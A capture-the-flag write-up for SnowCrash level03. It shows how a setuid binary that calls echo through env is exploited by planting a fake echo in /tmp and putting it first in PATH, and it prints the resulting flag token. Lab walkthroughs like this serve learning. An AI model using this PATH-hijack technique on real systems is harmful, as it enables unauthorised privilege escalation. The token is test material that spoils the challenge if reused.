# Level03

## Hint

Run the following command:
```
strings level03
```
Good luck !

## Answer

Let's check our current directory:
```
level03@SnowCrash:~$ ll
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 ./
d--x--x--x 1 root    users    340 Aug 30  2015 ../
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout*
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile*
```

Great ! We found an executable file, let's run it first !
```
level03@SnowCrash:~$ ./level03
Exploit me
```

We notice that it has the `s` permission, so it will be executed as flag03. Futhermore, when we run `strings level03` we see that the file contains the following string:
```
level03@SnowCrash:~$ strings level03
[...]
/usr/bin/env echo Exploit me
[...]
```

We know that this line is executed since it did print "Exploit me" when we ran it. Alright, let's see if we can modify the `echo` command to execute our getflag command:
```
level03@SnowCrash:~$ whereis echo
echo: /bin/echo /usr/share/man/man1/echo.1.gz
level03@SnowCrash:~$ echo getflag > /bin/echo
bash: /bin/echo: Permission denied
```

Nope we cannot, and it doesn't work with `env` either. In that case let's create a fake `echo` file in our `/tmp` directory and add it to the start of our path:
```
level03@SnowCrash:~$ echo getflag > /tmp/echo
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ PATH=/tmp:$PATH
```

Alright let's run the executable again:
```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```